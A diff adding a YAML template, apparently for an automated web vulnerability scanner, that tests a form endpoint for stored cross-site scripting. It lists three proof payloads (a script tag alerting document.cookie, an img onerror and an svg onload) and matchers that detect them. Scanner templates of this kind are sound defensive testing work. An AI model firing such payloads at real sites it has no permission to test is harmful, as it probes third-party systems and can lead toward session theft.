@@ -1,0 +1,38 @@
+id: generic-xss-stored
+info:
+  name: Stored XSS
+  severity: high
+  description: Generic stored cross-site scripting testing
+  tags:
+    - xss
+    - stored
+    - generic
+
+generic:
+  endpoint: "{{xss_stored}}"
+
+  method: POST
+
+  content_type: "application/x-www-form-urlencoded"
+
+  body_template: "{{parameter}}={{payload}}&submit=Submit"
+
+  parameter: "message"
+
+  payloads:
+    - name: "script_alert"
+      value: "<script>alert(document.cookie)</script>"
+
+    - name: "img_onerror"
+      value: "<img src=x onerror=alert(1)>"
+
+    - name: "svg_onload"
+      value: "<svg onload=alert(1)>"
+
+  matchers:
+    - type: word
+      words:
+        - "<script>alert("
+        - "<img src=x onerror="
+        - "<svg onload="
+      condition: or
